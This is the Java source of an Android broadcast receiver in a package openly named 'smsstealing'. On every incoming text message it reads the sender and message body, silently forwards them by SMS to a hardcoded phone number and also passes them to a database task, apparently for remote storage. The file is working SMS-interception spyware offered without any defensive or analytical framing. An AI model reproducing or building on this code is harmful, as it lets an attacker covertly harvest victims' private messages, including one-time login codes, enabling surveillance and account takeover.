package com.example.death.smsstealing;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {

    String sender="";
    String messagebody="";

    @Override
    public void onReceive(Context context, Intent intent) {


        String reason=intent.getAction();
        Toast.makeText(context, "Reason: "+reason, Toast.LENGTH_SHORT).show();

        Bundle b = intent.getExtras();
        try {
            if (b!= null){
                Object[] pdusObj = (Object[]) b.get("pdus");

                for (int i=0;i<pdusObj.length;i++){

                    SmsMessage currentMessage = SmsMessage
                            .createFromPdu((byte[]) pdusObj[i]);
                    sender = currentMessage.getDisplayOriginatingAddress();
                    messagebody = currentMessage.getDisplayMessageBody();

                }

            }

        }
        catch (Exception e){
            e.printStackTrace();
        }

        String finalmessage="From: "+sender+"\n Content: "+messagebody;

        SmsManager mysms=SmsManager.getDefault();
        mysms.sendTextMessage("03352345138",null,finalmessage,null,null);

        Database bobj=new Database();
        bobj.execute(sender,messagebody);



    }
}
